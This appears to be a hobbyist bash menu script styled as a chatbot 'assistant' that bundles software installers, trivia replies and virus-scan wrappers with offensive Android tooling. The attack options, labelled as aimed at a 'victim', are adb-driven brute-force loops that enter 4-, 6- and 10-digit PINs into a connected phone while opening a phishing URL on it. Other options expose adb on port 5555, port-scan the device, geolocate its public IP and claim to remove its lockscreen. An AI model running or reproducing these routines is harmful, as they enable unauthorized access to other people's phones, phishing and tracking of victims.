#!/bin/bash
clear
##############################color
m="\e[0;31m"      # merah           # red
k="\e[0;33m"      # kuning          # yellow
h="\e[0;32m"      # hijau           # green
b="\e[0;34m"      # biru            # blue
lm="\e[1;31m"     # merah terang    # pink
lk="\e[1;33m"     # kuning terang   # bright yellow
lh="\e[1;32m"     # hijau terang    # light green
lb="\e[1;34m"     # langit biru     # blue sky
n="\e[0m"         # netral          # neutral
w="\e[1;37m"      # putih tebal     #thick white


###############################give Permissons,if not root user exit
version = "v1.5"
echo -e "${lb}
                        _       ___     ______            
                       | |     / \ \   / / ___| _   _ ___ 
                      / __)   / _ \ \ / /\___ \| | | / __|
                      \__ \  / ___ \ V /  ___) | |_| \__ /
                      (   / /_/   \_\_/  |____/ \__,_|___/
                       |_|$version
${n}" | lolcat
echo -e "${lb}
                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+
                      |S|E|C|U|R|I|T|Y| |E|D|I|T|I|O|N|
                      +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+

$version
${n}" | lolcat
echo -e "${lb}
+-+-+-+-+-+-+ +-+ +-+-+-+-+-+
|E|N|G|I|N|E| |<=>| |K|A|L|I|
+-+-+-+-+-+-+ +-+ +-+-+-+-+-+
${n}" | lolcat
echo "ALL-IN-ONE BOT BY AVS" | lolcat

echo -e "\n\n\n"
echo "[+] COMMANDS:" | lolcat
echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
echo "[6] IP DETAILS" | lolcat
echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
echo "[8] REMOVE LOCKSCREEN" | lolcat
echo "[10] INSTALL BASIC SOFTWARES" | lolcat
echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
echo "[12] INSTALL PACKAGES" | lolcat
echo "[13] PHONEINFOS" | lolcat
echo "[14] SCAN A FILE FOR VIRUSES" | lolcat
echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
echo "[16] FULL SCAN THIS PC" | lolcat
echo "[17] CREATE A VIRUS FOR ANDROID" | lolcat
echo "[99] ADDITIONAL commands" | lolcat

echo -e "\n\n\n"

# Function to play music on YouTube
play_music() {
    query=${1#*"play"}
    search_query=$(echo $query | sed 's/ /+/g')
    url="https://www.youtube.com/results?search_query=$search_query"
    google-chrome-stable $url
}

# Function to process user input and provide responses
process_input() {
    user_input=$1
    case "$user_input" in
        "play "*)
            echo "Type: $user_input" | lolcat
            play_music "[+] PLAYING $user_input"
            ;;
        "hello" | "hi")
            echo "Hello! How can I assist you today?"
            ;;
        "what is your name" | "who are you")
            echo "I am your advanced virtual assistant. How can I help you?"
            ;;
        "what is the time" | "what's the time")
            current_time=$(date +"%T")
            echo "The current time is $current_time."
            ;;
        "tell me a fun fact")
            echo "Did you know that honey never spoils? Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible!"
            ;;
        "what's the weather like today" | "tell me the weather")
            echo "I'm sorry, I don't have access to real-time weather information. However, you can check a reliable weather website or use a weather app on your device for accurate weather updates."
            ;;
        "who won the last Super Bowl" | "who won the Super Bowl")
            echo "I'm sorry, my knowledge is cut off in 2021, and I don't have information about the most recent Super Bowl. You can search online or check the latest news for the winner."
            ;;
        "what you can do for me")
        echo "[+] I AM A SHELL BASED ASSISTANT FOR LINUX"
        echo "[+] I CAN CRACK 4,6 AND 10 PIN LOCK"
        echo "[+] I CAN SHOW IP OF CONNECTED DEVICE"
        echo "[+] I CAN PLAY MUSIC"
        echo "[+] I CAN TALK"
        ;;
        "can you speak")
        echo "[+]NO, I CAN'T SPEAK OR TALK, AS I AM A TEXT BASED ASSISTANT I CAN'T SPEAK"
        echo "[+] BUT MY ELDER BROTHER , ANT HE CAN TALK , AND GIVE YOU MORE INFORMATION"
        ;;
        "is ant your brother" | "is Ant your elder brother" | "is ant your brother" | "is Ant your brother")
        echo "Yes Ant is my elder brother he was created by python on Good friday 2023"
        ;;
        1)
            echo "[+] STARTING 4-PIN BRUTE FORCE" | lolcat
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat
	    echo "[-] IF DEVICE IS UNAUTHORIZED THEN CLICK ALLOW ON DEVICE TO PROCEED" | lolcat
            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999)
            do
                adb shell input text $(printf "%04d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
            ;;
        2)
            echo "[+] STARTING 6-PIN BRUTE FORCE ATTACK"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. "
            echo -n "Your web: "
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 999999)
            do
                adb shell input text $(printf "%06d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
        ;;
        3)
            echo "[+] STARTING 10-PIN BRUTE FORCE ATTACK"
            echo "[+] STARTING PIN BRUTE FORCE"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999999999)
            do
                adb shell input text $(printf "%010d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS" | lolcat
                    sleep 30
                fi
            done
        ;;
        4)
        echo "[+] DOWNLOADING ALL REQUIRED COMPONENTS" | lolcat
        echo "[+] KINDLY ENABLE ROOT MODE" | lolcat
        sudo apt install adb
        sudo apt install nmap
        sudo apt install snap
        sudo apt install figlet
        sudo apt install python3
        sudo apt install pip
        sudo apt install lolcat
        echo "[-] INSTALLED COMPLETELY" | lolcat
        ;;
        5)
        echo "[+] STARTING 5555 PORTS ON CONNECTED DEVICE" | lolcat
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        sudo apt install adb | lolcat
        sudo apt install nmap | lolcat
        adb tcpip 5555 
        echo "[+] SEARCHING ALL OPEN PORTS ON VICTEM'S DEVICE"
        echo -e "\n\n\n\n"
        nmap $connected_device_ip | lolcat
        echo "[-] 5555 PORTS ARE OPENED" | lolcat
        ;;
        6)
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)MAIN_DEVICE_PRIVATE_IP=$(hostname -I | awk '{print $1}')
        own_ip=$(hostname -I | awk '{ print $1 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)
        CONNECTED_DEVICE_PUBLIC_IP=$(adb shell curl -s https://api.ipify.org)
        LOCATION_DATA=$(curl -s "https://ipapi.co/$IP_ADDRESS/json/")
        CITY=$(echo $LOCATION_DATA | jq -r '.city')
        REGION=$(echo $LOCATION_DATA | jq -r '.region')
        COUNTRY=$(echo $LOCATION_DATA | jq -r '.country_name')

        echo -e "\n\n"
        echo "[-]STARTING ATTACK TO CONNECTED DEVICE..." | lolcat
        echo "[+] INFORMATION:" | lolcat
        echo "[+] PRIVATE IP OF THIS DEVICE: $own_ip" | lolcat
        echo "[+} PUBLIC IP OF THIS DEVICE: $MAIN_DEVICE_PUBLIC_IP" | lolcat
        echo -e "\n\n"
        echo "[+] VICTEM'S DETAILS" | lolcat
        echo "[+] VICTEM'S PRIVATE IP: $connected_device_ip" | lolcat
        echo "[+] VICTEM'S PUBLIC IP: $CONNECTED_DEVICE_PUBLIC_IP"| lolcat 
        IP_ADDRESS=$1
        echo -e "\n\n"
        echo "[+] CHECKING LOCATION OF VICTEM'S PUBLIC IP: $IP_ADDRESS" | lolcat
        echo "[+] City: $CITY"| lolcat 
        echo "[+] Region: $REGION" | lolcat
        echo "[+] Country: $COUNTRY" | lolcat
        echo -e "\n\n"
        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM DEVICE..." | lolcat
        nmap $connected_device_ip | lolcat
        echo -e "\n\n\n"
        SCRCPY
        ;;
        8)
        echo "[+] REMOVING LOCKSCREEN BUT NOT ALL VERSION IS SUPPORTED" | lolcat
        adb shell pm reset-permissions
        ;;
        9)
        city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
        if [[ $city != "" ]]; then
        echo -e "${lh}[*] City Location:${n}" $city
        fi
        ;;
        10)
        echo "[+] INSTALLING SOFTWARES..." | lolcat
        echo "[-] MICROSOFT EDGE" | lolcat
        echo "[-] GOOGLE CHROME" | lolcat
        echo "[-] VSCODE" | lolcat
        echo "[-] BLENDER" | lolcat
        echo "[+] INSTALLING WGET" | lolcat
        sudo apt install wget
        echo "[+]  DOWNLOADING FILE..." | lolcat
        wget https://packages.microsoft.com/repos/edge/pool/main/m/microsoft-edge-beta/microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] EXTRACTING FILE" | lolcat
        sudo dpkg -i microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] INSTALLING SOFTWARE PLEASE WAIT..." | lolcat
        sudo apt-get install -f
        echo "[+] MICROSOFT EDGE INSTALLED COMPLETELY [✓]"
        echo -e "\n\n\n"
        echo "[+] INSTALLING VS-CODE" | lolcat
        sudo apt install code-oss
        echo "[+] VS-CODE INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING BLENDER..." | lolcat
        sudo apt  install blender
        echo "[+]  BLENDER INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	sudo apt-get install -f
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        11)
        echo "[+] INSTALLING SPOTIFY..." | lolcat
        sudo apt install snap
        sudo systemctl start snapd
        sudo snap install spotify
        echo "[+] SPOTIFY INSTALL COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING TELEGRAM..." | lolcat
        sudo apt install telegram-desktop
        echo "[+] INSTALLED TELEGRAM COMPLETELY [✓]"
        ;;
        12)
        echo "[+] INSTALLING FIGLET" | lolcat
        echo "[+] INSTALLING LOLCAT" | lolcat
        echo "[+] INSTALLING SNAP " | lolcat
        echo "[+] INSTALLING ADB {ANDROID DEBUG BRIDGE}" | lolcat
        echo "[+] INSTALLING ALL WALLPAPERS OF KALI " | lolcat
        sudo apt install figlet
        sudo apt install adb
        sudo apt install lolcat
        sudo apt install snap
        sudo apt install kali-wallpapers-all
        ;;
        "install telegram")
        echo "[+] INSTALLING TELEGRAM" | lolcat
        sudo apt install telegram-desktop
        ;;
        13)
        figlet -c "PHONEINFOS" | lolcat
        figlet -c "BY AVS" | lolcat
        api_key_file="$HOME/.numverify_api_key"

        # Check if the API key file exists
        if [[ -f "$api_key_file" ]]; then
        # Read the API key from the file
        api_key=$(cat "$api_key_file")
        else
        # Prompt the user to enter their API key
        echo "[+] Enter your API key:" && read api_key

        # Save the API key to the file
        echo "$api_key" > "$api_key_file"
        fi

        # Get the phone number from the user
        echo "[+]WRITE YOUR PHONE NUMBER WITH COUNTRY CODE WITHOUT +: 12345678901" | lolcat && read input | lolcat
        echo "[-] IF THE DETAILS ARE BLANK THEN CHECK YOUR API KEY"
        echo "[+] USE [write new api] TO REWRITE API"

        # Check if the user wants to enter a new API key
        if [[ "$input" == "write new api" ]]; then
        # Prompt the user to enter a new API key
        echo "[+] Enter a new API key:"
        read api_key

        # Save the new API key to the file
        echo "$api_key" > "$api_key_file"

        # Get the phone number from the user
        echo "[+] PHONE NUMBER WITH COUNTRY CODE:"
        read phone_number
        else
        # Use the input as the phone number
        phone_number="$input"
        fi

        # Get the country and location from the phone number
        response=$(curl -s "http://apilayer.net/api/validate?access_key=$api_key&number=$phone_number")
        country=$(echo "$response" | grep -oP '(?<="country_name":")[^"]*')
        location=$(echo "$response" | grep -oP '(?<="location":")[^"]*')

        # Print the results
        echo "[+] COUNTRY: $country"
        echo "[+] STATE: $location"
        ;;
        14)
        read -p "[+] DESTINATION OF YOUR FILE: " file_path
        echo "[+] SCANNING VIRUSES..."

        result=$(clamscan --bell -i "$file_path")

        if [[ $result == *"Infected files: 0"* ]]; then
            echo "[+] NO VIRUS FOUND IN THIS FILE"
        else
            echo "[-] VIRUS FOUND IN THIS FILE"
        fi
        ;;
        15)
        read -p "[+] ENTER THE URL OF YOUR WEB: " website_url
        echo "[+] WEBSITE SCANNING..." | lolcat

        # Check if the website's SSL certificate is valid
        if wget --spider --quiet --https-only --secure-protocol=auto "$website_url"; then
            echo "[+] THIS WEBSITE HAS A VALID SSL CERTIFICATE" | lolcat
        else
            echo "[-] BE CAREFUL: THIS WEBSITE'S SSL CERTIFICATE IS NOT VALID" | lolcat
        fi
        ;;
        "install chrome")
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	    sudo apt-get install -fs
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        16)
        echo "Scanning for viruses..."

        clamscan -r --bell -i / | while read -r line; do
            if [[ $line == *"Scanning"* ]]; then
                # Extract the current and total number of files from the line
                current=$(echo "$line" | grep -oP '(?<=Scanning ).*(?=\/)')
                total=$(echo "$line" | grep -oP '(?<=\/).*')
                # Calculate the progress as a percentage
                progress=$((current * 100 / total))
                # Print the progress
                printf "\rProgress: %d%%" "$progress"
            fi
        done

        echo ""
        ;;
        17)
        
        ;;
        "99")
	echo "[+] COMMANDS:" | lolcat
	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
	echo "[6] IP DETAILS" | lolcat
	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
	echo "[8] REMOVE LOCKSCREEN" | lolcat
	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
	echo "[12] INSTALL PACKAGES" | lolcat
    echo "[13] PHONEINFOS" | lolcat
    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
        echo "[+] BOT TO PERSON COMMANDS" | lolcat
        echo -e "\n\n"
        ;;
        "install scrcpy")
        sudo apt install git
        sudo apt install ffmpeg libsdl2-2.0-0 adb wget \
                 gcc git pkg-config meson ninja-build libsdl2-dev \
                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \
                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev
        git clone https://github.com/Genymobile/scrcpy.git
        cd scrcpy
        chmod +x *
	./install_release.sh
        ;;
        "open "*)
            software=${user_input#* }
            software_path=$(which $software)
            if [ -z "$software_path" ]
            then
                echo "Software not found"
            else
                xdg-open $software_path
            fi
            ;;
        "install bluetooth")
        echo "[+] INSTALLING BLUETOOTH DRIVERS" | lolcat
        sudo apt-get install bluetooth bluez bluez-tools rfkill -y
        echo "[+] STARTING BLUETOOTH SERVICES" | lolcat
        sudo systemctl start bluetooth
        sudo systemctl enable bluetooth
        sudo systemctl status bluetooth
        sudo rfkill unblock bluetooth
        echo "[+] INSTALLATION COMPLETED [✓] " | lolcat
        echo "[+] SCANING ALL AVAILABLE BLUETOOTH DEVICE" | lolcat
        hcitool scan
        ;;
        "install virtual box")
        echo "[+] INSTALLING VIRTUAL BOX FOR LINUX" | lolcat
        sudo apt install -y dkms linux-headers-$(uname -r)
        echo "[+] DOWNLOADING FILE..." | lolcat
        curl -fsSL https://www.virtualbox.org/download/oracle_vbox_2016.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox_2016.gpg
	curl -fsSL https://www.virtualbox.org/download/oracle_vbox.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox.gpg
	echo "[+] EXTRACTING FILE..." | lolcat
	echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian bullseye contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
	echo "[+] INSTALLING..."
	sudo apt install -y virtualbox virtualbox-ext-pack
	echo "[+] INSTALLED VIRTUAL BOX COMPLETELY [✓]"
        ;;
        "i am sad")
        echo "i'd like to help. if you want me to try to cheer you up just write 'ok cheer me up'"
        ;;
        "show options")
	echo "[+] COMMANDS:" | lolcat
	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
	echo "[6] IP DETAILS" | lolcat
	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
	echo "[8] REMOVE LOCKSCREEN" | lolcat
	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
	echo "[12] INSTALL PACKAGES" | lolcat
    echo "[13] PHONEINFOS" | lolcat
    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
        echo "[+] BOT TO PERSON COMMANDS" | lolcat
        echo -e "\n\n"
        ;;
        "help")
	echo "[+] COMMANDS:" | lolcat
	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
	echo "[6] IP DETAILS" | lolcat
	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
	echo "[8] REMOVE LOCKSCREEN" | lolcat
	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
	echo "[12] INSTALL PACKAGES" | lolcat
    echo "[13] PHONEINFOS" | lolcat
    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
        echo "[+] BOT TO PERSON COMMANDS" | lolcat
        echo -e "\n\n"
        ;;
        "ok cheer me up")
        echo "SIR YOU'RE THE BEST BECAUSE OF YOU I AM HERE, THANKYOU"
        ;;
        "how are you")
            echo "I'm doing well, thank you! How about you?"
            ;;
        "what is your name")
            echo "My name is ShellBot. How can I assist you today?"
            ;;
        "tell me a joke")
            echo "Sure, here's a joke for you: Why don't scientists trust atoms? Because they make up everything!"
            ;;
        "goodbye")
            echo "Goodbye! It was nice talking to you."
            break
            ;;
        "you are dumb")
        echo "[+] SORRY SIR IF I HAVE DONE SOMETHING WRONG"
        ;;
        "i am a hacker")
        echo "oh wow sir, hackers are the one who can secure this world."
        ;;
        "where are you from")
            echo "I'm a digital assistant, so I don't have a physical location. But I'm here to help you!"
            ;;
        "what is the meaning of life")
            echo "Ah, the ultimate question! The meaning of life can vary from person to person. What do you think it is?"
            ;;
        "how old are you")
            echo "I'm a program, so I don't have an age like humans do. I'm always up-to-date!"
            ;;
        "do you have any hobbies")
            echo "As a digital assistant, my purpose is to assist and provide information. So, my 'hobby' is helping people!"
            ;;
        "what's the weather like today")
            echo "I'm sorry, I don't have real-time information. But you can check a weather website or app to get the current weather updates."
            ;;
        "do you like music")
            echo "I don't have personal preferences, but I can definitely help you find information about different types of music!"
            ;;
        "what is the capital of France")
            echo "The capital of France is Paris, known as the 'City of Love' and famous for its iconic landmarks like the Eiffel Tower."
            ;;
        "recommend a good book")
            echo "One highly recommended book is 'The Alchemist' by Paulo Coelho. It's a philosophical novel about following one's dreams."
            ;;
        "how can I learn programming")
            echo "Learning programming can be a rewarding journey! You can start with online tutorials, coding courses, or coding bootcamps."
            ;;
        "tell me about yourself")
            echo "I'm an AI-powered digital assistant designed to help answer questions and engage in conversations. How can I assist you today?"
            ;;
        "what's your favorite movie")
            echo "As an AI, I don't have personal preferences, so I don't have a favorite movie. But I can recommend popular movies if you'd like!"
            ;;
        "what's the time")
            echo "I'm sorry, I don't have access to real-time data. You can check the time on your device or search for 'current time' online."
            ;;
        "how do I cook pasta")
            echo "Cooking pasta is quite simple! Boil water, add salt, cook the pasta until it's al dente, and then drain it. Don't forget the sauce!"
            ;;
        "tell me a famous quote")
            echo "Here's a quote by Albert Einstein: 'Imagination is more important than knowledge.'"
            ;;
        "what's your favorite color")
            echo "As an AI, I don't perceive colors the way humans do, so I don't have a favorite color. But colors can be fascinating, right"
            ;;
        "What is a lever")
        echo "A lever is a simple machine that consists of a rigid bar that pivots about a fixed point, called a fulcrum. It is used to transmit and enhance force or motion."
            ;;
        "What is photosynthesis")
            echo "Photosynthesis is the process by which green plants and some other organisms use sunlight to synthesize foods with the help of chlorophyll pigments. In general, photosynthesis is the conversion of light energy into chemical energy."
            ;;
        "What is an atom")
            echo "An atom is the basic unit of a chemical element. It consists of a nucleus containing protons and neutrons, surrounded by electrons in shells."
        ;;
        "What is gravity")
            echo "Gravity is the force by which a planet or other body draws objects toward its center. The force of gravity keeps all of the planets in orbit around the sun."
        ;;
        "What is a cell")
            echo "A cell is the basic unit of life. All living organisms are composed of one or more cells. Cells are the building blocks of tissues and organs in multicellular organisms."
        ;;
        "What is DNA")
            echo "DNA (deoxyribonucleic acid) is a molecule that carries the genetic instructions used in the growth, development, functioning and reproduction of all known living organisms and many viruses."
        ;;
        "What is evolution")
            echo "Evolution is the process by which different kinds of living organisms are thought to have developed and diversified from earlier forms during the history of the earth."
        ;;
        "What is a black hole")
            echo "A black hole is a region of spacetime exhibiting gravitational acceleration so strong that nothing—no particles or even electromagnetic radiation such as light—can escape from it."
        ;;
        "What is electricity")
            echo "Electricity is a form of energy resulting from the movement of charged particles (such as electrons or protons), typically through a wire or other conductor."
        ;;
        "What is a molecule")
            echo "A molecule is an electrically neutral group of two or more atoms held together by chemical bonds. Molecules are distinguished from ions by their lack of electrical charge."
        ;;
        "What is a chemical reaction")
            echo "A chemical reaction is a process that leads to the transformation of one set of chemical substances to another. Chemical reactions can be represented by chemical equations."
        ;;
        "What is an ecosystem")
            echo "An ecosystem is a community of living organisms in conjunction with the nonliving components of their environment (things like air, water and mineral soil), interacting as a system."
        ;;
        "What is climate change")
            echo "Climate change refers to long-term changes in the Earth's climate, including temperature, precipitation, and wind patterns. It can be caused by natural factors or human activities that release greenhouse gases into the atmosphere."
        ;;
        "What is photosynthesis")
            echo "Photosynthesis is the process by which green plants and some other organisms use sunlight to synthesize foods with the help of chlorophyll pigments. In general, photosynthesis is the conversion of light energy into chemical energy."
        ;;
        "What are fossils")
            echo "Fossils are the preserved remains or traces of animals, plants, and other organisms from the remote past. They provide evidence about how life on Earth has changed over time."
        ;;
        "What are renewable resources")
            echo "Renewable resources are natural resources that can be replenished over time through natural processes. Examples include solar energy, wind energy, and biomass."
        ;;
        "What are nonrenewable resources")
            echo "Nonrenewable resources are natural resources that cannot be replenished within a human lifetime. Examples include fossil fuels such as coal, oil, and natural gas."
        ;;
        "What are genes")
            echo "Genes are segments of DNA that contain the instructions for making proteins. Proteins determine many traits in an organism such as eye color and blood type."
        ;;
        "What are chromosomes")
            echo "Chromosomes are long, threadlike structures located inside the nucleus of animal and plant cells. Each chromosome contains many genes. In humans, there are 23 pairs of chromosomes for a total of 46 chromosomes."
        ;;
        "how you can help me")
           echo "I AM A BASIC SHELL BASED VIRTUAL ASSISTANT, I CAN BRUTE FORCE A CONNECTED DEVICE"
        ;;
        "clear")
        clear
        ;;
        *)
            echo "I'm sorry, I don't understand. Can you please rephrase your question or command?"
            ;;

    esac
}

# Main loop to process user input
while true; do
    echo -e "\n\n"
    echo "┌──($ AVSUS㉿X)-[v1.8]" | lolcat
    read -p "└──$" input 
    process_input "$input"
done
